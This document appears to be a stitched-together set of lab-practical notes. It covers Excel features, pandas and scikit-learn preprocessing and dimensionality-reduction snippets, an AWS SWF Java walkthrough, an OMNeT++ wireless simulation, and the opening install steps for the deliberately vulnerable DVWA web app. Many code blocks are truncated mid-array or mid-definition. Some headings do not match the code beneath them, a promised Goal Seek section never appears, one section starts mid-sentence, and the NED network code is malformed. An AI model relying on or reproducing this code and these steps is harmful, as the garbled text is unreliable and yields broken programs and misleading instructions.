Aim: Introduction to Excel
 Perform conditional formatting on a dataset using various criteria.
 Create a pivot table to analyze and summarize data.
 Use VLOOKUP function to retrieve information from a different
worksheet or table.
 Perform what-if analysis using Goal Seek to determine input values for
desired output.

Perform conditional formatting on a dataset using various criteria.
We perform conditional formatting on the &quot;Profit&quot; column to highlight cells with a profit
greater than 800 using following steps:
Steps:
1. Select the "Profit" column (Column E)
2. Go to the "Home" tab on the ribbon.
3. Click on "Conditional Formatting" in the toolbar.
4. Choose "Highlight Cells Rules" and then "Greater Than."
5. Enter the threshold value as 800.
6. Customize the formatting options (e.g., choose a fill color).
7. Click "OK" to apply the rule.


Create a pivot table to analyze and summarize data.
1. Select the entire dataset including headers.
2. Go to the "Insert" tab on the ribbon.
3. Click on "PivotTable."
4. Choose where you want to place the PivotTable (e.g., new worksheet).
5. Drag "Category" to the Rows area.
6. Drag "Sales" to the Values area, choosing the sum function.


Use VLOOKUP function to retrieve information from a different
worksheet or table.
Use the VLOOKUP function to retrieve the category of &quot;Product M&quot; from a separate
worksheet named &quot;Product Table&quot; using following steps:

Steps:
1. Assuming your "Product Table" is in a different worksheet.
2. In a cell in your main dataset, enter the formula:
=VLOOKUP("M", 'Product Table'!A:B, 2, FALSE)

=VLOOKUP(G7,Fees!A1:B24,1,FALSE) (For Fees in Student table)

=VLOOKUP(B2, Dummy_Data_2!$A$2:$D$6, 2, FALSE)

#Show Statistics
df.describe()


3.3 Navigating DataFrames
#Select First Row
print(df.iloc[0])

#SelectThree Rows
print(df.iloc[1:4])

#All rows upto and including the fourth row
print(df.iloc[:4])


print(df.columns)

#Set Index
df.set_index("Id")

#Show Row
val = 1
df.loc[val]

3.8 Finding Unique Values 



# unique will return an array of all unique values in a column 
df ['SepalLengthCm'].unique() 


# value_counts will display all unique values with the number of times each value appears 
df ['SepalLengthCm'].value_counts()


3.9 Handling Missing Values 

# select missing values, show 2 rows 
df[df ['SepalLengthCm'].isnull()].head (2) 


3.10 Deleting a Column

4.1 Rescaling a feature
Use scikit-learn's MinMaxScaler to rescale a feature array

import numpy as np 
from sklearn import preprocessing

# create a feature 
feature= np.array([ 
[-500.5], 
[-100.1],

4.2 Standardizing a Feature 
scikit-learn's StandardScaler transforms a feature to have a mean of 0 and a standard deviation of 1. 

# create a feature

# create scaler 
robust_scaler = preprocessing.RobustScaler() 


#transform feature 
robust_scaler.fit_transform(feature)

# create feature matrix 
features = np.array([

# create normalizer 
normalizer = Normalizer(norm="l2")


#transform feature matrix 
normalizer.transform(features)



# transform feature matrix 
features_l1_norm = Normalizer(norm="l1").transform(features)

print("Sum of the first observation's values: 1.0")




4.9 Grouping Observations Using Clustering

from sklearn.datasets import make_blobs

# make k-means clusterer 
clusterer = KMeans (3, random_state=0) 


# fit clusterer 
clusterer.fit(features) 


# predict values 
df['group'] = clusterer.predict(features) 


df.head()


features= np.array([ 
[1.1, 11.1], 
[2.2, 22.2], 
[3.3, 33.3], 
[np.nan, 55]]) 



# keep only observations that are not (denoted by ~) missing 
features [~np.isnan(features).any(axis=1)]

Encoding Nominal Categorical Features 
Problem:
You have a feature with nominal classes that has no intrinsic ordering (e.g., apple, pear, banana). 
Solution:
One-hot encode the feature using scikit-learn's LabelBinarizer:


import numpy as np 
from sklearn.preprocessing import LabelBinarizer, MultiLabelBinarizer



feature = np.array([ 
["Texas"], 
["California"], 
["Texas"], 
["Delaware"], 
["Texas"] ])



# create one-hot encoder 
one_hot = LabelBinarizer() 

# one-hot encode feature 
one_hot.fit_transform(feature)


# view feature classes 
one_hot.classes_


If we want to reverse the one-hot encoding, we can use inverse_transform:

# reverse one-hot encoding 
one_hot.inverse_transform (one_hot.transform(feature))


We can even use pandas to one-hot encode the feature with get_dummies
import pandas as pd 
pd.get_dummies (feature [:, 0])


To handle a situation where each observation lists multiple classes with 
MultiLabelBinarizer():
# create multiclass feature 
multiclass_feature = [ 
("Texas", "Florida"), 
("California", "Alabama"), 
("Texas", "Florida"), 
("Delaware", "Florida"), ("Texas", "Alabama") 
]



# create multiclass one-hot encoder 
one_hot_multiclass = MultiLabelBinarizer()

# one-hot encode multiclass feature 
one_hot_multiclass.fit_transform(multiclass_feature)


# view classes 
one_hot_multiclass.classes_




5.2 Encoding Ordinal Categorical Features 
Problem:
You have an ordinal categorical feature (e.g., high, medium, low). 
Solution:
Use pandas DataFrame's replace method to transform string labels to numerical equivalents


import pandas as pd 
# create features 
df = pd.DataFrame({"Score": ["Low", "Low", "Medium", "Medium", "High"]}) 


# create mapper 
scale_mapper = { 
"Low": 1, "Medium": 2, "High": 3 
} 



# replace feature values with scale 
df ["Score"].replace(scale_mapper)


from sklearn.feature_extraction import DictVectorizer 
data_dict = [ 
{"Red": 2, "Blue": 4}, 
{"Red": 4, "Blue": 3}, 
{"Red": 1, "Yellow":2}, 
{"Red": 2, "Yellow": 2} ]



# create dictionary vectorizer 
#force DictVectorizer to output a
dictvectorizer = DictVectorizer (sparse=False) 



# convert dictionary to feature matrix 
features = dictvectorizer.fit_transform(data_dict)



features


# get feature names 
dictvectorizer.get_feature_names_out()




Imputing Missing Class Values 
Problem:
You have a categorical feature containing missing values that you want to replace with predicted 
values. 
Solution:
The ideal solution is to train a machine learning classifier algorithm to predict the missing 
values, commonly a k-nearest neighbors (KNN) classifier

# load libraries 
import numpy as np
from sklearn.neighbors import KNeighborsClassifier


X = np.array([[0, 2.10, 1.45], 
[1, 1.18, 1.33], 
[0, 1.22, 1.27], 
[1, -0.21, -1.19]]) 


X_with_nan = np.array([[np.nan, 0.87, 1.31], 
[np.nan, -0.67, -0.22]])


# train KNN learner 
clf = KNeighborsClassifier(3, weights='distance') 
trained_model = clf.fit(X[:,1:], X[:, 0])


# predict missing values' class 
imputed_values = trained_model.predict(X_with_nan[:, 1:]) 


# join column of predicted class with their other features 
X_with_imputed = np.hstack((imputed_values.reshape(-1, 1), X_with_nan[:, 1:]))



# join two feature matricies 
np.vstack((X_with_imputed, X))



An alternative solution is to fill in missing values with the feature's most frequent value

#from sklearn.preprocessing import Imputer 
from sklearn. impute import SimpleImputer



# join the two feature matricies. 
X_complete = np.vstack((X_with_nan, X))


imputer = SimpleImputer(missing_values=np.nan,strategy='most_frequent') #strategy


imputer.fit_transform (X_complete)


Handling Imbalanced Classes 
Problem 
You have a target vector (dataset) with highly imbalanced classes.

import numpy as np 
from sklearn. ensemble import RandomForestClassifier 
from sklearn.datasets import load_iris 
iris = load_iris()


features = iris.data 
target = iris.target


# remove first 40 observations 
features = features [40:, :] 
target = target [40:]


# create binary target vector indicating if class 0 
target = np.where((target == 0), 0, 1)


target


# create weights 
weights = {0: .9, 1: 0.1}



# Create random forest classifier with weights 
RandomForestClassifier(class_weight=weights) 
RandomForestClassifier (class_weight={0: 0.9, 1: 0.1})


You can pass balanced, which automatically creates weights inversely proportional to class frequencies

RandomForestClassifier (class_weight="balanced") 


i_class0 = np.where(target == 0) [0] 
i_class1 = np.where(target == 1) [0]

n_class0 = len(i_class0) 
n_class1 = len(i_class1)

i_class1_downsampled = np.random.choice(i_class1, size=n_class0, replace=False)



np.hstack((target [i_class0], target [i_class1_downsampled]))

## Join together class 0's feature matrix with the 
# downsampled class 1's feature matrix 
np.vstack((features[i_class0,:], features [i_class1_downsampled, :]))[0:5]


i_class_upsampled = np.random.choice(i_class0, size=n_class1, replace=True) 

np.concatenate((target [i_class_upsampled], target [i_class1]))


# Join together class 0's upsampled feature matrix with class 1's feature matrix 
np.vstack((features[i_class_upsampled,:], features[i_class1,:]))[0:5]

PCA

Principal Component Analysis (PCA)
 Perform PCA on a dataset to reduce dimensionality.
 Evaluate the explained variance and select the appropriate number of principal
components.
 Visualize the data in the reduced-dimensional space.


Problem: 
Given a set of features, you want to reduce the number of features while retaining the variance in the data. 
Solution: 
Use principal component analysis with scikit's PCA


# Load libraries 
from sklearn.preprocessing import StandardScaler 
from sklearn.decomposition import PCA 
from sklearn import datasets


# Load the data 
digits = datasets.load_digits()


# Standardize the feature matrix 
X = StandardScaler().fit_transform(digits.data) 


# Create a PCA that will retain 99% of the variance  
PCAVAL = PCA(n_components=0.99, whiten=True) 
# Conduct PCA 
X_pca = PCAVAL.fit_transform(X)



# Show results 
print('Original number of features: ', X.shape[1]) 
print('Reduced number of features:', X_pca.shape[1])


Problem:
You suspect you have linearly inseparable data and want to reduce the dimensions. 
Solution:
Use an extension of principal component analysis that uses kernels to allow for non-linear dimensionality reduction



# Load libraries 
from sklearn. decomposition import PCA, KernelPCA 
from sklearn.datasets import make_circles





# Create linearly inseparable data 
X,_ = make_circles (n_samples=1000, random_state=1, noise=0.1, factor=0.1)



# Apply kernal PCA with radius basis function (RBF) kernel 
kpca = KernelPCA (kernel="rbf", gamma=15, n_components=1) 
Х_kрса = kpca.fit_transform (X) 



print('Original number of features:', X.shape[1]) 
print('Reduced number of features:', Х_kрса.shape[1])





###Kernel PCA 
In our solution 
we used scikit-learn's make_circles to generate a simulated dataset with a target vector of two classes and two features. make_circles makes linearly inseparable data; specifically, one class is surrounded on all sides by the other class.
Reducing Features by Maximizing Class Separability Problem 
You want to reduce the features to be used by a classifier. 
Solution 
Try linear discriminant analysis (LDA) to project the features onto component axes that maximize the separation of classes






# Load libraries 
from sklearn import datasets 
from sklearn.discriminant_analysis import LinearDiscriminantAnalysis





# Load the Iris flower dataset: 
iris = datasets.load_iris () 
X = iris.data
y = iris.target



# Create an LDA that will reduce the data down to 1 feature 
lda = LinearDiscriminantAnalysis(n_components=1)



# run an LDA and use it to transform the features 
X_lda = lda.fit(X, y).transform (X)



#Print the number of features 
print('Original number of features:', X.shape[1]) 
print('Reduced number of features:', X_lda.shape[1])




We can use explained_variance_ratio_ to view the amount of variance explained by each com- ponent. In our solution the single component explained over 99% of the variance




## View the ratio of explained variance 
lda.explained_variance_ratio_







Problem: 
You have a set of numerical features and want to remove those with low variance (i.e., likely containing little information). 
Solution: 
Select a subset of features with variances above a given threshold: 
Principle: Low variance features contains less information 
Calculate variance of each features and then drop the features with low variance 
Features should be in same scale



##Thresholding Numerical Feature Variance 
from sklearn import datasets 
from sklearn. feature_selection import VarianceThreshold 




# Load iris data 
iris = datasets.load_iris() 


# Create features and target 
X = iris.data 
y = iris.target


# Create VarianceThreshold object with a variance with a threshold of 0.5 
thresholder = VarianceThreshold (threshold=.5)


# Conduct variance thresholding 
X_high_variance = thresholder.fit_transform(X)




# View first five rows with features with variances above threshold 
X_high_variance[0:5]




#We can see the variance for each feature using variances_: 
# View variances 
thresholder.fit(X).variances_





##Handling Highly Correlated Features Problem 
You have a feature matrix and suspect some features are highly correlated. 
Solution 
Use a correlation matrix to check for highly correlated features. 
If highly correlated features exist, consider dropping one of the correlated features: 




# Load libraries 
import pandas as pd 
import numpy as np




# Create feature matrix with two highly correlated features 
X = np.array([[1, 1, 1], 
[2, 2, 0], 
[3, 3, 1], 
[4, 4, 0], 
[5, 5, 1], 
[6, 6, 0], 
[7, 7, 1], 
[8, 7, 0], 
[9, 7, 1]])




# Convert feature matrix into DataFrame 
df = pd.DataFrame(X)



#View the dataframe
df



#Identify Highly Correlated Features and drop 1
# Create correlation matrix 
corr_matrix = df.corr().abs()



# Select upper triangle of correlation matrix 
upper = corr_matrix.where(np.triu (np.ones (corr_matrix.shape), k=1).astype (np.bool_))



# Find index of feature columns with correlation greater than 0.95
to_drop =[column for column in upper.columns if any (upper[column] > 0.95)]



# Drop features 
df.drop(df[to_drop], axis=1)



# Correlation matrix 
df.corr()


Second, we look at the upper triangle of the correlation matrix to identify pairs of highly correlated features
# Upper triangle of correlation matrix 
upper




Third, we remove one feature from each of those pairs from the feature set.


# Drop features 
df.drop(df[to_drop], axis=1)



##Removing Irrelevant Features for Classification 
Problem 
You have a categorical target vector and want to remove uninformative features. 
###chi-square (x2) chi-square (x2): If the features are categorical, calculate a chi- square (x2) statistic between each feature and the target vector.



# Load libraries 
from sklearn.datasets import load_iris 
from sklearn.feature_selection import SelectKBest 
from sklearn.feature_selection import chi2 



# Load iris data 
iris = load_iris()  
# Create features and target 
X = iris.data 
y = iris.target



# Convert to categorical data by converting data to integers 
X = X.astype(int)



# Select two features with highest chi-squared statistics 
chi2_selector = SelectKBest (chi2, k=2) 
X_kbest = chi2_selector.fit_transform(X, y)



# Show results 
print('Original number of features:', X.shape[1]) 
print('Reduced number of features:', X_kbest.shape[1]) 



###ANOVA F-value If the features are quantitative, compute the ANOVA F-value between each feature and the target vector.



# Load libraries 
from sklearn.datasets import load_iris 
from sklearn.feature_selection import SelectKBest 
from sklearn.feature_selection import f_classif 
# Load iris data 
iris = load_iris() 



# Create features and target 
X = iris.data 
y = iris.target



# Create an SelectKBest object to select features with two best ANOVA F-Values 
fvalue_selector = SelectKBest (f_classif, k=2)




# Apply the SelectKBest object to the features and target 
X_kbest = fvalue_selector.fit_transform(X, y)




# Show results 
print('Original number of features: ', X.shape[1]) 
print('Reduced number of features:', X_kbest.shape[1])

logic and worker programs to host them.


SignUp for AWS

Download AWS SDK from link: https://docs.aws.amazon.com/sdk-for-java/v1/developer-guide/setup-
install.html

Download the JAR files related to the AWS Flow Framework (e.g., aws-
java-sdk-swf-flow).

o Add these JAR files to your project's classpath. The exact steps depend on
your IDE.

Compile the Code:
o Use your IDE's compile function or a command like 
javac Greeter.java Workflow.java GreeterImpl.java GreetingWorkflowImpl.java WorkflowWorker.java

Develop the Code:
o Create the following Java classes in your project:
▪ Greeter.java (interface)
▪ GreeterImpl.java (implementation)
▪ Workflow.java (interface)
▪ GreetingWorkflowImpl.java (implementation)
▪ WorkflowWorker.java (worker program)
o Copy the code snippets provided in the previous explanation (interfaces,
implementations, and worker program).

Run the Worker (Simulated Execution):
o Execute the WorkflowWorker class (e.g., java WorkflowWorker).
o You should see "Hello, World!" printed to the console (even without AWS
interaction).

Additional Notes:
• This is a simplified local execution to understand the workflow structure.
• For real workflow execution with AWS services like SWF, you'd need to deploy the
worker program to a server and register it with SWF.
• Refer to the AWS Flow Framework documentation for detailed information on
workflow execution and activity
scheduling: https://aws.amazon.com/swf/details/flow/

Description:
● Simulator used : Omnet++
● Simulator can be downloaded from below link:
https://omnetpp.org/omnetpp (recommended version is omnet++ 4.2.2).
● After installing Omnet++, we need to install inet framework which is specially designed for
wireless simulation. You can download inet framework from below link.
https://inet.omnetpp.org/Download.html
● After downloading there are certain steps to be followed to include this framework in
omnet++ as follows:
● Download the INET sources.
● Unpack it into the directory of your choice: (tar xvfz inet-&lt;version&gt;.tgz)(recommended is tar or .tgz)
● Recommeded version is inet 2.1
● Start the Omnet++ IDE, and import the project via File -&gt; Import -&gt; Existing Projects to the
Workspace. A project named inet should appear.
● Build with Project -&gt; Build, or hit ctrl+b
● Now you should be able to launch example simulations.
Steps for practical:
● Then open inet/examples/
● Right click on adhoc -create new folder as SimpleAdhoc.
● Right click on your newly created folder and select NED file. Give name as Net1.



Click on new ned file
click on new managed mobility wireless network wizard.


then configure it

Number of hosts: 5

Topology as not static

then finish


It should have 1 channelControl/Converter
1 configurator
1 wifi symbol icon client


Now try to execute by right click on ned file Run as-1-Omnet++ simulation.



below is the code that will be available in source part of net1.ned once configured.
package inet.examples.adhoc.SimpleAdhoc;
// numOfHosts: 5
import inet.networklayer.autorouting.ipv4.IPv4NetworkConfigurator;
import inet.nodes.inet.WirelessHost;
import inet.nodes.wireless.AccessPoint;
import inet.world.radio.ChannelControl;
network Net1
{
parameters:
int numOfHosts;
submodules:
host[numOfHosts]: WirelessHost
{
@display(&quot;r=,,#707070&quot;);
}
ap: AccessPoint

@display(&quot;p=61,46&quot;);
}
configurator: IPv4NetworkConfigurator

Download DVWA file from github 
Extract and remove master name from folder and paste it in xampp's htdocs folder

Go to localhost/dashboard to check XAMPP

Go to localhost/DVWA

Go to htdocs/DVWA/config

in it rename config.inc.php.dist to config.inc.php

Go to htdocs/DVWA/config


Open config.inc.php
